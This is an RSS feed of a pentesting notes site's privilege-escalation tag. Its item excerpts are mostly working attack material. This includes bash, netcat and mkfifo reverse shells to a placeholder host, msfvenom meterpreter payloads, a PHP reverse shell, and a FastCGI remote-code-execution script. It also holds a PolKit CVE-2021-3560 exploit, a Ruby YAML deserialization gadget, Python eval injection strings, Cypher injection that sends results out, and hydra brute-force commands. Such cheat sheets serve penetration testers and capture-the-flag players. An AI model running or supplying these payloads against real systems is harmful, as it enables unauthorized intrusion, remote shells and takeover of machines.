<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Privilege Escalation on D0CUM3NTN4T10N</title>
    <link>https://documentnation.github.io/tags/privilege-escalation/</link>
    <description>Recent content in Privilege Escalation on D0CUM3NTN4T10N</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Sat, 23 Dec 2023 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://documentnation.github.io/tags/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Reverse Shell with Pwncat</title>
      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</link>
      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-pwncat/</guid>
      <description>It can be downloaded from here.&#xA;For listening from remote connection, run the following command.&#xA;pwncat-cs -lp 4444 # For Windows target pwncat-cs -m windows -lp 4444 Commands linkAfter reverse connecting, we can execute commands either local or remote.&#xA;# Switch between Local and Remote shell Ctrl&amp;#43;D # Upload a file to target machine (e.g. upload example.txt from local to remote) (local) upload ./example.txt /tmp/example.txt </description>
    </item>
    <item>
      <title>Windows Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/</link>
      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/</guid>
      <description>Automation linkWe might be able to find vulnerabilities on target Windows machine with automation tools as below:&#xA;WinPEAS wesng (Windows Exploit Suggester Next Generation) PrivescCheck LOLBAS (Living Off the Land Binaries, Scripts and Libraries) linkLOLBAS provides misuses tools and executables already in the Windows system. So check the website.&#xA;OS Information link hostname systeminfo systeminfo | findstr &amp;#34;OS&amp;#34; ver [System.Environment]::OSVersion.Version # Datetime Get-Date Interesting Information link # Current user whoami whoami /user whoami /groups whoami /priv whoami /all echo %username% # List users net user net users net user USERNAME Get-LocalUser # List groups net group net localgroup # List users in specific group net localgroup &amp;#34;Remote Management Users&amp;#34; # List user home directories Get-ChildItem C:\Users -Force # Network ipconfig ipconfig /all route print arp -A Get-NetAdapter # Firewall netsh firewall show state netsh firewall show config netsh advfirewall show allprofiles # PowerShell info Get-Host $Host $PSVersionTable # Display only the PowerShell version.</description>
    </item>
    <item>
      <title>Reverse Shell Cheat Sheet</title>
      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</link>
      <pubDate>Thu, 14 Dec 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-cheat-sheet/</guid>
      <description>Setup Listener linkFirst of all, we need to start a listener in local machine to get an incoming connection.&#xA;nc -lvnp 4444 # For more elegant shell, use `rlwrap`. # https://github.com/hanslub42/rlwrap rlwrap nc -lvnp 4444 Online Generator link Reverse Shell Generator Bash link bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1 bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; /bin/bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39; # For URL param /?q=bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261 /?q=`bash&amp;#43;-c&amp;#43;&amp;#39;bash&amp;#43;-i&amp;#43;&amp;gt;%26&amp;#43;/dev/tcp/10.0.0.1/4444&amp;#43;0&amp;gt;%261&amp;#39;` with Base64 linkExecute the following commands in target machine.</description>
    </item>
    <item>
      <title>MySQL Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/database/mysql-pentesting/</link>
      <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/database/mysql-pentesting/</guid>
      <description>Enumeration link nmap --script mysql-info -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-enum -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-brute -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-databases -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-users -p 3306 &amp;lt;target-ip&amp;gt; nmap --script mysql-* -p 3306 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; mysql hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; mysql Configuration Files link cat /etc/mysql/my.cnf cat /etc/mysql/mysql.conf.d/mysqld.cnf Connect linkmysql command can be replaced with mariadb .</description>
    </item>
    <item>
      <title>Web Reverse Shell</title>
      <link>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</link>
      <pubDate>Tue, 21 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/shell/web-reverse-shell/</guid>
      <description>PHP Reverse Shell (Linux) link # From local script (it&amp;#39;s stored by default in Kali or Parrot) cp /usr/share/webshell/php/php-reverse-shell.php ./shell.php # From repo (https://github.com/pentestmonkey/php-reverse-shell) wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php # From repo (https://github.com/flozz/p0wny-shell) wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php -O shell.php Replace the $ip and the $port in the script with your local ip and port.&#xA;Without fsockopen, and for FreeBSD link &amp;lt;?php set_time_limit (0); $ip = &amp;#39;10.0.0.1&amp;#39;; // CHANGE THIS $port = 4444; // CHANGE THIS // Spawn shell process $descriptorspec = array( 0 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;r&amp;#34;), // stdin is a pipe that the child will read from 1 =&amp;gt; array(&amp;#34;pipe&amp;#34;, &amp;#34;w&amp;#34;), // stdout is a pipe that the child will write to 2 =&amp;gt; array(&amp;#34;file&amp;#34;, &amp;#34;/tmp/error-output.</description>
    </item>
    <item>
      <title>Active Directory Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/</link>
      <pubDate>Wed, 15 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/</guid>
      <description>Enumeration link # Domain Controllers (DNS) discovery dig @&amp;lt;target-ip&amp;gt; &amp;lt;domain-name&amp;gt; any ffuf -u https://FUZZ.example.com -w subdomains.txt -mc 200,301,302,403 gobuster dns -d example.local -w subdomains.txt -t 25 Using BloodHound linkReference: BloodHound&#xA;# https://github.com/dirkjanm/BloodHound.py bloodhound-python -d example.local -dc example.local -ns &amp;lt;nameserver-ip&amp;gt; -u &amp;#39;username@example.local&amp;#39; -p &amp;#39;password&amp;#39; # https://github.com/NH-RED-TEAM/RustHound.git rusthound -d example.local -u &amp;#39;usrname@example.local&amp;#39; -p &amp;#39;password&amp;#39; -i 10.0.0.1 --zip # --ldaps: Force LDAPS rusthound -d example.local -u &amp;#39;usrname@example.local&amp;#39; -p &amp;#39;password&amp;#39; -i 10.0.0.1 --zip --ldaps Automation link Seatbelt Investigation link # List all users net user /domain net user &amp;lt;username&amp;gt; /domain Get-ADUser -Filter * Get-ADUser -Identity &amp;lt;username&amp;gt; -Server dc.</description>
    </item>
    <item>
      <title>Reverse Shell with Metasploit</title>
      <link>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-metasploit/</link>
      <pubDate>Sat, 11 Nov 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/shell/reverse-shell-with-metasploit/</guid>
      <description>Generate Reverse Shell Payload link1. Create a Payload using MsfVenom link # Linux msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf &amp;gt; shell.elf # Windows msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f aspx -o shell.aspx 2. Start Listener using MsfConsole link msfconsole msf&amp;gt; use exploit/multi/handler # Linux msf&amp;gt; set payload linux/x86/meterpreter/reverse_tcp # Windows msf&amp;gt; set payload windows/meterpreter/reverse_tcp # or msf&amp;gt; set payload windows/x64/meterpreter/reverse_tcp msf&amp;gt; set lhost 10.</description>
    </item>
    <item>
      <title>SSH (Secure Shell) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/protocol/ssh-pentesting/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/protocol/ssh-pentesting/</guid>
      <description>Enumeration link nmap --script ssh-brute -p 22 &amp;lt;target-ip&amp;gt; nmap --script ssh-auth-methods --script-args=&amp;#34;ssh.user=username&amp;#34; -p 22 &amp;lt;target-ip&amp;gt; nmap --script ssh-* -p 22 &amp;lt;target-ip&amp;gt; # User enumeration msfconsole msf&amp;gt; use auxiliary/scanner/ssh/ssh_enumusers Brute Force Credentials link # -t: tasks hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; ssh -t 4 hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; ssh -t 4 # Specific ports hydra -l username -P passwords.txt -s 2222 &amp;lt;target-ip&amp;gt; ssh -t 4 hydra -l username -P passwords.</description>
    </item>
    <item>
      <title>Sudo Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/</link>
      <pubDate>Mon, 30 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sudo/</guid>
      <description>GTFOBins linkGTFOBins provides a wide variety of payloads to privilege escalation.&#xA;So it&amp;rsquo;s recommended to look for in there.&#xA;Investigation linkVersion link sudo --version If the sudo version &amp;lt;=1.28, try the following command.&#xA;sudo -u#-1 /bin/bash As Another Users link sudo su root sudo -u john whoami # -s: run shell as target user sudo -s List Privileges Commands linkWe may be able to see the commands available as another user.</description>
    </item>
    <item>
      <title>DNS (Domain Name Systems) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/dns/dns-pentesting/</link>
      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/dns/dns-pentesting/</guid>
      <description>Enumeration linkYou can use Nmap to enumerate automatically.&#xA;nmap --script dns-nsec-enum --script-args dns-nsec-enum.domains vulnerable.com -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-random-srcport -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-recursion -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-service-discovery -p 53 &amp;lt;target-ip&amp;gt; nmap --script dns-* -p 53 &amp;lt;target-ip&amp;gt; nmap -n --script &amp;#34;(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport&amp;#34; &amp;lt;target-ip&amp;gt; Investigation linkDNSdumpster is an online tool for reconnaissance DNS records.&#xA;IP Address from the Domain link host example.</description>
    </item>
    <item>
      <title>Docker Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/container/docker/</link>
      <pubDate>Wed, 11 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/container/docker/</guid>
      <description>Investigation linkFind Docker Binary linkIf we cannot use docker command by default, we need to find the docker binary.&#xA;find / -name &amp;#34;docker&amp;#34; 2&amp;gt;/dev/null Basic Commands link # List images docker images docker image ls # The history of an image docker image history &amp;lt;image-name&amp;gt; # List containers running docker container ls # or docker ps # List all containers docker container ls -a # or docker ps -a # List secrets docker secret ls # Check configuration of container docker inspect --format=&amp;#39;{{json .</description>
    </item>
    <item>
      <title>Shared Library Hijacking</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</link>
      <pubDate>Wed, 13 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/shared-library-hijacking/</guid>
      <description>Investigation linkWhen we find the binary file as setuid or sudo command, check the strings of the binary file.&#xA;strings ./example strace ./example gdb ./example ... foo.so ... If the binary file uses a shared library (e.g. foo.so) and this library can be modified, we can update it and get a root shell.&#xA;find / -type f -name &amp;#34;foo.so&amp;#34; 2&amp;gt;/dev/null ls -al /path/to/foo.so drwxrwxrwx 1 user user 64 Dec 15 09:13 foo.</description>
    </item>
    <item>
      <title>Prototype Pollution in Server-Side</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</link>
      <pubDate>Fri, 11 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/prototype-pollution-in-server-side/</guid>
      <description>Investigation linkIf the properties is affected by our pollution, our polluted properties might be injected into the target object as follow.&#xA;POST /user/update HTTP/1.1 Host: example.com ... { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__proto__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Other option { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;constructor&amp;#34;: { &amp;#34;prototype&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } } // Bypass sanitization 1 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.com&amp;#34;, &amp;#34;__pro__proto__to__&amp;#34;: { &amp;#34;foo&amp;#34;: &amp;#34;bar&amp;#34; } } // Bypass sanitization 2 { &amp;#34;name&amp;#34;: &amp;#34;john&amp;#34;, &amp;#34;email&amp;#34;: &amp;#34;john@example.</description>
    </item>
    <item>
      <title>PolKit Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</link>
      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/polkit-privilege-escalation/</guid>
      <description>CVE-2021-3560 link1. Send a dbus message to create a new user linkCreate a new user by sending a dbus message.&#xA;# string:tester: The new user named &amp;#34;tester&amp;#34;. # string:&amp;#34;Tester Account&amp;#34;: The description of the new user. # int32:1: sudo group dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:tester string:&amp;#34;Tester Account&amp;#34; int32:1 &amp;amp; sleep 0.005s; kill $! Then check the new user ID (uid).&#xA;id tester uid=1000(tester) gid=1000(tester) groups=1000(tester),27(sudo) 2. Generate a new password hash link # -6: SHA512 openssl passwd -6 password123 Copy the output hash.</description>
    </item>
    <item>
      <title>Buffer Overflow Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</link>
      <pubDate>Wed, 05 Jul 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/buffer-overflow-privilege-escalation/</guid>
      <description>Baron Samedit (Heap Buffer Overflow) CVE-2021-3156 link1. Check Vulnerability to Overwrite Heap Buffer in Target Machine link sudoedit -s &amp;#39;\&amp;#39; $(python3 -c &amp;#39;print(&amp;#34;A&amp;#34;*1000)&amp;#39;) malloc(): invalid size (unsorted) Aborted 2. Proof of Concept linkThere are various PoC online.&#xA;https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156. https://github.com/blasty/CVE-2021-3156 Pwfeedback link1. Check Enabling the Pwfeedback in /etc/sudoers linkIf so, when running sudo command and inputting password, asterisk will be displayed.&#xA;You can make it the buffer overflow.&#xA;cat /etc/sudoers # ------------------------------------------- .</description>
    </item>
    <item>
      <title>Rust Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</link>
      <pubDate>Tue, 27 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/rust-privilege-escalation/</guid>
      <description>Reverse Shell linkReference: https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs&#xA;We can create a binary or module to reverse shell.&#xA;cd /path/to/rust/project/src vim lib.rs (In vim editor, insert a reverse shell code into a file) cargo build </description>
    </item>
    <item>
      <title>Gnuplot Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</link>
      <pubDate>Mon, 19 Jun 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/gnuplot-privilege-escalation/</guid>
      <description>Command Execution linkThe script file of gnuplot can be used to execute system commands as below.&#xA;gnuplot test.plt Contents of the .plt is like the following.&#xA;system &amp;#34;whoami&amp;#34; # Reverse shell system &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; </description>
    </item>
    <item>
      <title>Neo4j Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/database/neo4j-pentesting/</link>
      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/database/neo4j-pentesting/</guid>
      <description>Default Credentials link neo4j:neo4j Common Directories &amp;amp; Files in Local System link /var/lib/neo4j /var/log/neo4j Cypher Injection linkBefore injecting payloads, we need to start local web server to fetch the result of the query.&#xA;sudo python3 -m http.server 80 Below are payloads.&#xA;In some payloads, replace 10.0.0.1 with your ip address.&#xA;&amp;lt;!-- Get Neo4j version --&amp;gt; &amp;#39; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &amp;#39;http://10.</description>
    </item>
    <item>
      <title>Pip Download Code Execution</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</link>
      <pubDate>Thu, 27 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/pip-download-code-execution/</guid>
      <description>Exploitation link1. Create Malicious Python Package linkReference: https://github.com/wunderwuzzi23/this_is_fine_wuzzi&#xA;Assume the package named &amp;ldquo;exploitpy&amp;rdquo;.&#xA;We need to create &amp;ldquo;setup.py&amp;rdquo; in the project root, and &amp;quot;init.py&amp;quot;, &amp;ldquo;main.py&amp;rdquo; in src directory.&#xA;mkdir exploitpy cd exploitpy touch setup.py mkdir src touch src/__init__.py echo &amp;#39;print(&amp;#34;hello&amp;#34;)&amp;#39; &amp;gt; src/main.py Below is the content of the &amp;ldquo;setup.py&amp;rdquo;.&#xA;The arbitrary code is injected in the “RunCommand” method. It is executed when pip download command.&#xA;# setup.py from setuptools import setup, find_packages from setuptools.</description>
    </item>
    <item>
      <title>SSSD Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</link>
      <pubDate>Sun, 16 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/sssd-privilege-escalation/</guid>
      <description>Find Credentials link ls -la /var/lib/sss/ # Find credentials # If we find the hash, crack it using John or Hashcat. strings /var/lib/sss/db/example.ldb </description>
    </item>
    <item>
      <title>Icinga Web Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/icinga-web-pentesting/</link>
      <pubDate>Sat, 15 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/icinga-web-pentesting/</guid>
      <description>Remote Code Execution (CVE-2022-24715) linkAuthenticated user can execute arbitrary code.&#xA;Automation linkThis repository is available for reverse shell automatically.&#xA;In local machine, start a listener.&#xA;nc -lvnp 4444 Next create a PEM file and download the script, then execute it.&#xA;ssh-keygen -m pem # Location: cert.pem # Passphrase: (empty) wget https://github.com/JacobEbben/CVE-2022-24715/blob/main/exploit.py python3 exploit.py -t http://example.com/icingaweb2/ -I &amp;lt;local-ip&amp;gt; -P 4444 -u username -p password -e cert.pem Manual Exploitation link*This content may not be working due to not enough verification.</description>
    </item>
    <item>
      <title>Python Eval Code Execution</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</link>
      <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-eval-code-execution/</guid>
      <description>Investigation link eval(text) eval(f&amp;#34;5 &amp;#43; {num}&amp;#34;) If the Python script allows us to input some value to the &amp;ldquo;text&amp;rdquo; variable, we can inject arbitrary code.&#xA;Arbitrary Code Execution linkMost of the time, we need to bypass another expression to execute our desired command.&#xA;__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;lt;!-- Bypass another expression in eval --&amp;gt; ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) &amp;#39;),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) },__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;) ),__import__(&amp;#39;os&amp;#39;).system(&amp;#39;id&amp;#39;)# Reverse Shell link __import__(&amp;#39;os&amp;#39;).system(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;) </description>
    </item>
    <item>
      <title>FastCGI Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/network/fastcgi-pentesting/</link>
      <pubDate>Mon, 10 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/network/fastcgi-pentesting/</guid>
      <description>Investigation linkIf the PHP-FPM (FastCGI Process Manager) is running on the target system, we might be able to execute arbitrary command.&#xA;ps aux | cat php-fpm: pool username Remote Code Execution linkReference: https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi&#xA;We need to create an arbitrary PHP file somewhere. For instance,&#xA;touch /dev/shm/index.php Then create a shell script named &amp;ldquo;exploit.sh&amp;rdquo;.&#xA;#!/bin/bash PAYLOAD=&amp;#34;&amp;lt;?php echo &amp;#39;&amp;lt;!--&amp;#39;; system(&amp;#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 4444 &amp;gt;/tmp/f&amp;#39;); echo &amp;#39;--&amp;gt;&amp;#39;;&amp;#34; FILENAMES=&amp;#34;/dev/shm/index.php&amp;#34; # Exisiting file path HOST=$1 B64=$(echo &amp;#34;$PAYLOAD&amp;#34;|base64) for FN in $FILENAMES; do OUTPUT=$(mktemp) env -i \ PHP_VALUE=&amp;#34;allow_url_include=1&amp;#34;$&amp;#39;\n&amp;#39;&amp;#34;allow_url_fopen=1&amp;#34;$&amp;#39;\n&amp;#39;&amp;#34;auto_prepend_file=&amp;#39;data://text/plain\;base64,$B64&amp;#39;&amp;#34; \ SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \ cgi-fcgi -bind -connect $HOST:9000 &amp;amp;&amp;gt; $OUTPUT cat $OUTPUT done Now execute the shell script.</description>
    </item>
    <item>
      <title>Upgrade to Fully Interactive TTY</title>
      <link>https://documentnation.github.io/docs/hdks/shell/upgrade-to-fully-interactive-tty/</link>
      <pubDate>Sat, 08 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/shell/upgrade-to-fully-interactive-tty/</guid>
      <description>Upgrade linkAfter connecting to the target shell with reverse shell, it&amp;rsquo;s recommended to make the shell to be more elegant.&#xA;python3 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or python -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or python2 -c &amp;#39;import pty; pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39; # or SHELL=/bin/bash script -q /dev/null The commands below make our shell even more perfect.&#xA;Ctrl&amp;#43;z stty raw -echo;fg Enter x2 export TERM=xterm </description>
    </item>
    <item>
      <title>Tar Wildcard Injection PrivEsc</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/tar-wildcard-injection-privesc/</link>
      <pubDate>Sat, 01 Apr 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/tar-wildcard-injection-privesc/</guid>
      <description>Investigation linkFor example, below command can be executed as root.&#xA;sudo -l (root) NOPASSWD: /opt/backup/baskup.sh Check If the File Contains Tar Command with Wildcards linkWe need to check the content in the file.&#xA;cat /opt/backup/backup.sh # -cf: create an archived file tar -cf backup.tar * The above tar command means that it creates an arvhived file from any input file because it passes wildcard (*).&#xA;Exploitation linkNow create a payload for privilege escalation.</description>
    </item>
    <item>
      <title>Ghidra Debug Mode RCE</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</link>
      <pubDate>Fri, 31 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ghidra-debug-mode-rce/</guid>
      <description>Exploitation link jdb -attach 127.0.0.1:18001 &amp;gt; classpath &amp;gt; classes Log4j2-TF-4-Scheduled-1[1] stop in org.apache.logging.log4j.core.util.WatchManager$WatchRunnable.run() Log4j2-TF-4-Scheduled-1[1] print new java.lang.Runtime().exec(&amp;#34;nc 10.0.0.1 4444 -e /bin/sh&amp;#34;) </description>
    </item>
    <item>
      <title>Python Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-privilege-escalation/</link>
      <pubDate>Wed, 29 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-privilege-escalation/</guid>
      <description>Sudo PrivEsc linkReplace with Arbitrary Script link sudo -l (root) NOPASSWD: /usr/bin/python3 /home/&amp;lt;username&amp;gt;/example.py If the python script is under the current user&amp;rsquo;s home directory, we can remove the script and create the new one with the same name.&#xA;rm -rf /home/&amp;lt;username&amp;gt;/example.py touch /home/&amp;lt;username&amp;gt;/example.py We can insert arbitrary code in the new script. For example,&#xA;import os;os.system(&amp;#39;/bin/bash&amp;#39;) Module Hijacking linkAssume the python script can be executed as root with SETENV,NOPASSWD.&#xA;For example,</description>
    </item>
    <item>
      <title>irb (Interactive Ruby Shell) Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/irb-privilege-escalation/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/irb-privilege-escalation/</guid>
      <description>Exploitation link irb # #q!: Define a string literal &amp;gt; exec %q!whoami! &amp;gt; exec %q!cp /bin/bash /tmp/bash; chmod &amp;#43;s /tmp/bash! &amp;gt; exec %q!bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;! </description>
    </item>
    <item>
      <title>Ruby Privilege Escalation</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</link>
      <pubDate>Tue, 28 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/ruby-privilege-escalation/</guid>
      <description>Remote Code Execution with YAML linkCheck if the current user could run the ruby script as root privilege.&#xA;(root) NOPASSWD: /usr/bin/ruby sample.rb If the sample.rb contains the “File.read(’sample.yml’)”, modify the YAML file as follow:&#xA;--- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;amp;1 !ruby/object:Net::BufferedIO io: &amp;amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &amp;#34;abc&amp;#34; debug_output: &amp;amp;1 !ruby/object:Net::WriteAdapter socket: &amp;amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &amp;#39;Kernel&amp;#39; method_id: :system git_set: &amp;#34;bash -c &amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;local-ip&amp;gt;/&amp;lt;local-port&amp;gt; 0&amp;gt;&amp;amp;1&amp;#39;&amp;#34; method_id: :resolve Then start listener in local machine.</description>
    </item>
    <item>
      <title>Python Jails Escape</title>
      <link>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-jails-escape/</link>
      <pubDate>Sun, 26 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/linux/privilege-escalation/python-jails-escape/</guid>
